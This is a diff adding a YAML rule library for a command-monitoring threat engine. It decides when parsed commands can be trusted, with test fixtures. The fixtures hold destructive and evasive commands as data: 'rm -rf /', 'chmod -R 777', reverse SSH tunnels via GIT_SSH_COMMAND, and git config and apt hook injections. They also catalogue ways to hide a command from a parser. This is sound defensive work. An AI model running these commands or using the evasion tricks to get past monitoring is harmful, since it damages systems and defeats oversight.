@@ -1,0 +1,394 @@
+# When a rule about a command may trust what the parser read, said once for every such rule.
+#
+# A rule that asks "does this command line run X" has two ways to answer. The parsed commands
+# (e.command.parsed_commands) say which commands a line runs and with which words, so `rm` in
+# a commit message or a here-document is not a command, and `sudo /bin/rm` is. The text
+# (e.command.command) says only that the letters are there.
+#
+# The parsed commands are the better answer where the parser read everything the line runs.
+# It does not always: `ssh host 'rm -rf /'`, `xargs rm`, `find . -exec rm {} +`,
+# `python3 -c "os.system('rm -rf /')"`, `eval "$cmd"` and `echo 'rm -rf /' | sh` all run an
+# rm the parser lists nowhere, because the command line is handed to another program as a
+# word or on a pipe. A rule that only asked the parsed commands would stop seeing those.
+#
+# So a rule asks both, and says which answer holds where:
+#
+#   e.command.parsed_commands.exists(c, <the command, by name and words>) ||
+#   (e.command.command.matches("<the text pattern>") && command_unread(e))
+#
+# command_unread(e) is true when the line holds something the parser cannot vouch for. The
+# first way is that the parser did not read the line to its end
+# (e.command.parsed_incomplete): it does not parse, or it stops inside a quote, a
+# here-document or a loop, as a capture that was cut does. The commands before that point
+# are listed, and say nothing about the rest.
+#
+# The second is decided the safe way round: a command is trusted to run only itself when it
+# is named in
+# command_runs_only_itself, and every other command, known or not, leaves the line to its
+# text. A program missing from the list costs a rule nothing it had before (the text pattern
+# still decides for that line); a program wrongly on the list would. Add a command only when
+# none of its words is ever run as a command line, and say which words are when some are.
+#
+# The text pattern comes first in the conjunction so that command_unread is evaluated only
+# for the few lines the text pattern matches.
+library: commands
+version: 1
+spec: threat-rules/v1.3
+description: Whether the parsed commands of a command line are everything it runs.
+
+definitions:
+  - name: command_runs_only_itself
+    params: [c]
+    description: >
+      A parsed command is a program that runs none of its words as a command line, so what it
+      does is told by its name and words: a shell builtin that takes no command, a file or
+      text utility, a compiler, a package manager installing by name, a version control or
+      cloud client outside the subcommands that run something. A program that runs a word of
+      its own as a command line in some uses is listed with that use as its exception: ip
+      netns exec, apt -o (an APT::…::Pre-Invoke), rpm --eval, gem open, zip -TT, split
+      --filter, sort --compress-program, a compiler's -wrapper, iptables --modprobe, flyctl ssh
+      -C, doctl --ssh-command, git grep -O, tar -F. A shell is one when it runs a -c script,
+      which the parser reads, as the first stage of its pipeline and not inside another
+      shell's script, and the script is its last word: Codex logs its argv joined by spaces,
+      so `bash -lc rm -rf /x` was the script `rm -rf /x`, and words after a script leave the
+      line to its text. A variable that names a program to run (GIT_SSH_COMMAND, EDITOR) is
+      asked of the line by command_unread, not here.
+
+      The body is written for the engine's cost bound, which an expression must fit under to
+      be evaluated without metering: the names are lists of at most sixteen (a longer list,
+      or one long regular expression, raises the size every other value is assumed to have),
+      and the commands with exceptions are a chain of conditionals, of which the bound counts
+      the costliest branch and not the sum.
+    body: >
+      c.name in ["cd", "pushd", "popd", "dirs", "pwd", "echo", "printf", "true", "false", ":", "test", "[", "set", "unset", "export", "declare"] ||
+      c.name in ["local", "readonly", "typeset", "shift", "return", "exit", "break", "continue", "wait", "sleep", "read", "umask", "ulimit", "hash", "type", "which"] ||
+      c.name in ["whereis", "unalias", "kill", "pkill", "pgrep", "killall", "jobs", "fg", "bg", "disown", "let", "getopts", "shopt", "ls", "cat", "tac"] ||
+      c.name in ["head", "tail", "wc", "cut", "uniq", "tr", "tee", "grep", "egrep", "fgrep", "rg", "ag", "ack", "jq", "yq"] ||
+      c.name in ["diff", "cmp", "comm", "paste", "join", "fold", "column", "nl", "rev", "expand", "od", "xxd", "hexdump", "strings", "base64", "base32"] ||
+      c.name in ["md5", "md5sum", "sha1sum", "sha224sum", "sha256sum", "sha384sum", "sha512sum", "shasum", "b2sum", "cksum", "sum", "file", "stat", "du", "df", "touch"] ||
+      c.name in ["mkdir", "rmdir", "rm", "cp", "mv", "ln", "install", "dd", "truncate", "fallocate", "shred", "chmod", "chown", "chgrp", "readlink", "realpath"] ||
+      c.name in ["basename", "dirname", "mktemp", "date", "seq", "yes", "expr", "bc", "printenv", "id", "whoami", "groups", "hostname", "uname", "uptime", "ps"] ||
+      c.name in ["free", "lsof", "tree", "unzip", "gzip", "gunzip", "zcat", "bzip2", "bunzip2", "xz", "unxz", "zstd", "iconv", "numfmt"] ||
+      c.name in ["tput", "clear", "pbcopy", "pbpaste", "curl", "wget", "http", "https", "httpie", "xh", "xhs", "dig", "nslookup", "host", "drill", "ping"] ||
+      c.name in ["traceroute", "whois", "ifconfig", "netstat", "ss", "gofmt", "goimports", "golangci-lint", "staticcheck", "actionlint", "shellcheck", "shfmt", "ruff", "black", "mypy"] ||
+      c.name in ["pyright", "flake8", "isort", "eslint", "prettier", "tsc", "pytest", "cargo", "rustc", "rustfmt", "javac"] ||
+      c.name in ["brew", "apt-cache", "dpkg", "dnf", "yum", "pacman", "apk", "pip", "pip3", "systemctl", "service", "journalctl"] ||
+      c.name in ["dmesg", "sysctl", "crontab", "useradd", "usermod", "userdel", "groupadd", "groupmod", "gpasswd", "passwd", "chpasswd", "visudo", "insmod", "modprobe", "rmmod", "lsmod"] ||
+      c.name in ["mount", "umount", "nft", "ufw", "swapon", "swapoff", "history", "codesign", "spctl", "pkgutil", "xattr", "defaults", "security", "ssh-keygen", "ssh-add"] ||
+      c.name in ["gpg", "gpg2", "openssl", "keytool", "bq", "gsutil", "terraform", "tofu", "terragrunt", "pulumi", "supabase", "vercel", "dropdb", "createdb"] ||
+      c.name in ["mysqladmin", "redis-cli"] ||
+      (c.name == "" ? size(c.argv) > 0 && c.argv[0].matches("^(.*/)?env$") &&
+         (size(c.argv) == 1 || size(c.argv) == 2 && c.argv[1] in ["-0", "--null", "-i", "--ignore-environment"]) :
+       c.name == "git" ? !c.args.matches("(?m)^(foreach|filter-branch|filter-repo|-x|--exec(=.*)?|--extcmd(=.*)?|--upload-pack(=.*)?|--receive-pack(=.*)?|--config-env(=.*)?|-O.*|--open-files-in-pager(=.*)?)$|^bisect\\nrun$|\\A(?:(?:-C|--git-dir|--work-tree|--namespace)\\n[^\\n]*\\n|--?[A-Za-z][^\\n]*\\n)*?-c\\n") :
+       c.name == "gh" ? !c.args.matches("(?m)^(alias|ssh|exec|extension|codespace|cs)$") :
+       c.name == "go" ? !c.args.matches("(?m)^-(exec|toolexec)(=.*)?$") :
+       c.name == "find" ? !c.args.matches("(?m)^-(exec|execdir|ok|okdir)$") :
+       c.name in ["tar", "gtar", "bsdtar"] ? !c.args.matches("(?m)^(--to-command|--checkpoint-action|--use-compress-program|--rsh-command|--rmt-command|--info-script|--new-volume-script|-I|-F)") :
+       c.name in ["sed", "gsed"] ? !c.args.matches("(?m)/[A-Za-z0-9]*e[A-Za-z0-9]*$|(^|[;{0-9$/])\\s*e(\\s|$)") :
+       c.name in ["awk", "gawk", "mawk", "nawk"] ? !c.args.matches("system\\s*\\(|\\|\\s*\"|\"\\s*\\||getline") :
+       c.name in ["sh", "bash", "zsh", "dash", "ksh"] ? c.stage == 0 && !c.nested && size(c.argv) > 1 && c.argv[size(c.argv) - 2].matches("^-[A-Za-z]*c[A-Za-z]*$") && !c.argv.exists(a, a == "") :
+       c.name in ["docker", "podman", "nerdctl", "docker-compose"] ? !c.args.matches("(?m)^(run|exec|create|debug)$") :
+       c.name == "kubectl" ? !c.args.matches("(?m)^(exec|run|debug|attach|plugin|--)$") :
+       c.name == "helm" ? !c.args.matches("(?m)^--post-renderer") :
+       c.name in ["npm", "pnpm", "yarn"] ? !c.args.matches("(?m)^(exec|x|dlx|npx|create|init|explore)$") :
+       c.name == "uv" ? !c.args.matches("(?m)^(run|tool|x)$") :
+       c.name == "mise" ? !c.args.matches("(?m)^(exec|x|run|watch|en)$") :
+       c.name == "aws" ? !c.args.matches("(?m)^(ssm|execute-command|ec2-instance-connect)$") :
+       c.name == "gcloud" ? !c.args.matches("(?m)^(ssh|scp|--command(=.*)?)$") :
+       c.name == "az" ? !c.args.matches("(?m)^(run-command|ssh)$") :
+       c.name == "cdk" ? !c.args.matches("(?m)^(-a|--app)(=.*)?$") :
+       c.name == "ip" ? !c.args.matches("(?m)^exec$") :
+       c.name in ["apt", "apt-get"] ? !c.args.matches("(?m)^(-[A-Za-z]*[oc]|--option|--config-file)") :
+       c.name == "rpm" ? !c.args.matches("(?m)^(--eval|-E|--define|-D|--pipe|--macros|--rcfile)|%\\(") :
+       c.name == "gem" ? !c.args.matches("(?m)^(open|exec|-e|--editor)") :
+       c.name == "zip" ? !c.args.matches("(?m)^(-TT|--unzip-command)") :
+       c.name == "split" ? !c.args.matches("(?m)^--filter") :
+       c.name == "sort" ? !c.args.matches("(?m)^--compress-program") :
+       c.name in ["gcc", "cc", "clang", "g++", "c++"] ? !c.args.matches("(?m)^(-wrapper|-fplugin|-B|--specs|-specs)") :
+       c.name == "iptables" ? !c.args.matches("(?m)^--modprobe") :
+       c.name == "flyctl" ? !c.args.matches("(?m)^(-C|--command)(=.*)?$|^(exec|run)$") :
+       c.name == "doctl" ? !c.args.matches("(?m)^--ssh-command") :
+       false)
+    tests:
+      - name: a_file_utility
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "grep -rn 'rm -rf /' docs | head -5" }
+      - name: env_with_nothing_to_run
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "env | sort | head -20" }
+      - name: env_running_a_program_the_list_does_not_know
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "env -u HOME ./deploy.sh" }
+      - name: a_commit_message
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "git add -A && git commit -m 'never run chmod 777 here'" }
+      - name: a_new_branch_is_not_inline_configuration
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "git switch -c fix/perms" }
+      - name: a_shell_script_the_parser_reads
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "sudo bash -c 'mkdir -p /srv/app && chown app /srv/app'" }
+      - name: a_program_the_list_does_not_know
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "caffeinate -i ./deploy.sh" }
+      - name: a_remote_command
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ssh build@host.example 'chmod 777 /srv'" }
+      - name: an_interpreter
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "python3 -c \"import os; os.system('chmod 777 /srv')\"" }
+      - name: find_that_runs_a_command
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "find . -name '*.sh' -exec chmod 777 {} +" }
+      - name: find_that_only_lists
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "find . -name '*.sh' -newer build.log" }
+      - name: git_running_a_command_per_commit
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "git rebase main --exec 'chmod 777 build'" }
+      - name: git_with_inline_configuration
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "git -C repo -c core.sshCommand='ssh -R 9000:localhost:22 host.example' fetch" }
+      - name: a_shell_reading_a_pipe
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "echo 'chmod 777 /srv' | sh" }
+      - name: a_shell_running_a_script_file
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cat > /tmp/x.sh <<'EOF'\nchmod 777 /srv\nEOF\nbash /tmp/x.sh" }
+      - name: a_shell_script_held_in_a_variable
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "bash -c \"$CMD\"" }
+      - name: a_container_command
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "docker exec web chmod 777 /srv" }
+      - name: a_container_build
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "docker build -t web . && docker push registry.example/web" }
+      - name: sed_that_runs_its_replacement
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "sed -n '1e chmod 777 /srv' /etc/hostname" }
+      - name: sed_that_edits
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "sed -i -e 's/chmod 644/chmod 600/' -e '/^#/d' install.sh" }
+      - name: awk_that_runs_a_command
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "awk 'BEGIN { system(\"chmod 777 /srv\") }'" }
+      - name: programs_that_run_one_of_their_words
+        match: e.command.parsed_commands.exists(c, !command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ip netns exec ns1 dd if=/dev/zero of=/var/big bs=1M" }
+      - name: apt_with_an_invoke_hook
+        match: e.command.parsed_commands.exists(c, !command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "apt-get -o APT::Update::Pre-Invoke::=\"chmod -R 777 /srv\" update" }
+      - name: zip_testing_with_a_command
+        match: e.command.parsed_commands.exists(c, !command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "zip x.zip f -T -TT 'chmod -R 777 /srv'" }
+      - name: a_remote_command_through_flyctl_or_doctl
+        match: e.command.parsed_commands.exists(c, !command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "flyctl ssh console -C 'chmod -R 777 /srv' && doctl compute ssh d --ssh-command 'id'" }
+      - name: a_compiler_wrapper_and_a_sort_helper
+        match: e.command.parsed_commands.exists(c, !command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "gcc -wrapper ./w x.c; sort --compress-program=./z big.txt" }
+      - name: git_grep_opening_a_pager
+        match: e.command.parsed_commands.exists(c, !command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "git grep -O'chmod -R 777 /srv' needle" }
+      - name: the_same_programs_running_nothing
+        match: e.command.parsed_commands.all(c, command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ip addr show && apt-get install -y curl && sort -u a.txt && zip -r out.zip src && gcc -O2 -o x x.c && flyctl deploy && rpm -qa" }
+      - name: a_codex_shell_command_logged_space_joined
+        match: e.command.parsed_commands.exists(c, !command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "bash -lc rm -rf /var/data" }
+      - name: a_shell_script_given_positional_parameters
+        match: e.command.parsed_commands.exists(c, !command_runs_only_itself(c))
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "bash -c 'echo \"$1\"' _ hello" }
+
+  - name: command_unread
+    params: [e]
+    description: >
+      The command line holds something the parsed commands do not tell: it was not read to its
+      end (it does not parse, or it stops inside a quote, a here-document or a loop, as a cut
+      capture does); it ends in a mark that says it was cut; one of its commands is not known
+      to run only itself (its name is unknown, or it may run one of its words as a command
+      line); or it assigns a variable that names a program to run, or that hands git config
+      (GIT_CONFIG_VALUE_0 and the like, whose alias or fsmonitor git runs) or zsh a startup
+      directory (ZDOTDIR). A rule about a command applies its text pattern to such a line, and
+      its parsed condition to every line.
+    body: >
+      e.command.parsed_incomplete ||
+      e.command.command.matches("(\\.\\.\\.\\[truncated\\]|…)$") ||
+      e.command.command.matches("\\b([A-Z_]*(EDITOR|VISUAL|PAGER|COMMAND|ASKPASS|EXTERNAL_DIFF)|BASH_ENV|ENV|LESSOPEN|LESSCLOSE|GIT_CONFIG_(COUNT|PARAMETERS|GLOBAL|SYSTEM|KEY_[0-9]+|VALUE_[0-9]+)|ZDOTDIR)=") ||
+      e.command.parsed_commands.exists(c, size(c.argv) > 0 && !command_runs_only_itself(c))
+    tests:
+      - name: git_config_passed_in_the_environment
+        # git reads these variables as config and runs an alias that starts with `!`.
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0='!rm -rf /srv' git x" }
+      - name: zsh_given_a_startup_directory
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "ZDOTDIR=/tmp/z zsh -c 'echo hi'" }
+      - name: a_capture_cut_inside_a_loop
+        # The commands before the loop are listed and run only themselves; the loop's body,
+        # where the cut fell, is not read.
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cd /srv && for d in cache logs; do chmod -R 777 $d && echo" }
+      - name: a_capture_cut_between_commands
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cd /srv && ls -la && chmod -R 7…" }
+      - name: a_line_that_ends_in_a_package_pattern
+        # Three dots end `./...`, which every Go command line does; they are not a cut mark.
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "echo 'chmod 777 is wrong'; go vet ./... && go test ./..." }
+      - name: a_comment_alone
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "# chmod 777 /srv would be wrong here" }
+      - name: every_command_runs_only_itself
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cd repo && git commit -m 'drop the chmod 777' && echo done" }
+      - name: a_here_document_written_to_a_file
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cat > NOTES.md <<'EOF'\nNever run `rm -rf /` or `chmod 777`.\nEOF" }
+      - name: an_assignment_alone
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "out=$(git rev-parse HEAD); echo \"$out\"" }
+      - name: a_command_line_that_does_not_parse
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "chmod 777 /srv )" }
+      - name: a_cut_capture
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cat > big.txt <<'EOF'\nlorem ipsum...[truncated]" }
+      - name: a_command_named_by_a_variable
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "cmd='chmod 777 /srv'; $cmd" }
+      - name: a_wrapper_the_parser_does_not_look_through
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "xargs -n1 chmod 777 < files.txt" }
+      - name: an_exported_program_to_run
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "export GIT_SSH_COMMAND='ssh -R 9000:localhost:22 host.example'; git fetch" }
+      - name: a_program_to_run_in_a_command's_environment
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "GIT_SSH_COMMAND='ssh -R 9000:localhost:22 host.example' git fetch" }
+      - name: a_script_inside_a_script_inside_a_script
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "bash -c \"bash -c 'chmod 777 /srv'\"" }
